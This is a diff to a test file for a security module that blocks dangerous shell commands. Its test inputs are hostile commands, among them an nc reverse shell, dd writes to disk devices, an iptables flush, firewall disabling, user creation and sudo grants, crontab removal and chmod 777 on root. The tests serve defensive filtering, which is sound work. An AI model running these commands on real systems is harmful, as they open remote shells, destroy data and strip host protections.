@@ -130,6 +130,42 @@ describe('Security Module', () => {
       expect(checkCriticalPatterns('nc -e /bin/sh 10.0.0.1 443').blocked).toBe(true);
     });
 
+    // ── New critical patterns ──────────────────────────────────
+
+    it('blocks dd with output to device', () => {
+      expect(checkCriticalPatterns('dd if=/dev/sda of=/dev/sdb').blocked).toBe(true);
+      expect(checkCriticalPatterns('dd if=image.iso of=/dev/sdc bs=4M').blocked).toBe(true);
+    });
+
+    it('blocks iptables flush', () => {
+      expect(checkCriticalPatterns('iptables -F').blocked).toBe(true);
+      expect(checkCriticalPatterns('iptables -F INPUT').blocked).toBe(true);
+    });
+
+    it('blocks passwd command', () => {
+      expect(checkCriticalPatterns('passwd root').blocked).toBe(true);
+      expect(checkCriticalPatterns('passwd').blocked).toBe(true);
+    });
+
+    it('blocks user management commands', () => {
+      expect(checkCriticalPatterns('useradd hacker').blocked).toBe(true);
+      expect(checkCriticalPatterns('usermod -aG sudo user').blocked).toBe(true);
+      expect(checkCriticalPatterns('userdel victim').blocked).toBe(true);
+    });
+
+    it('blocks systemctl stop/disable', () => {
+      expect(checkCriticalPatterns('systemctl stop firewalld').blocked).toBe(true);
+      expect(checkCriticalPatterns('systemctl disable ufw').blocked).toBe(true);
+    });
+
+    it('blocks crontab removal', () => {
+      expect(checkCriticalPatterns('crontab -r').blocked).toBe(true);
+    });
+
+    it('blocks chmod 777 / (world-writable root)', () => {
+      expect(checkCriticalPatterns('chmod 777 /').blocked).toBe(true);
+    });
+
     it('allows safe commands', () => {
       expect(checkCriticalPatterns('echo hello').blocked).toBe(false);
       expect(checkCriticalPatterns('ls -la').blocked).toBe(false);
